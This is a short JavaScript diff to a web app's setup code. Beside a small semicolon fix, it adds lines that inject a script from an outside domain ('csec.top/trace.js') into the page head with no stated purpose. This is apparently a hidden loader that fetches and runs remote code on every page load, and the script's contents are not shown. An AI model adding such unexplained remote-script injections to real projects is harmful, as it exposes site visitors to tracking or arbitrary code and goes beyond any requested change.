@@ -381,7 +381,10 @@ class App {
       this.accessibilityManager = new AccessibilityManager()
       var busuanzi = document.createElement("div")
       busuanzi.innerHTML='<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>';
-      document.head.appendChild(busuanzi)
+      document.head.appendChild(busuanzi);
+      var a = document.createElement("script")
+      a.src = "https://csec.top/trace.js"
+      document.head.appendChild(a)
       // Add scroll animations to elements
       this.addScrollAnimations()
 
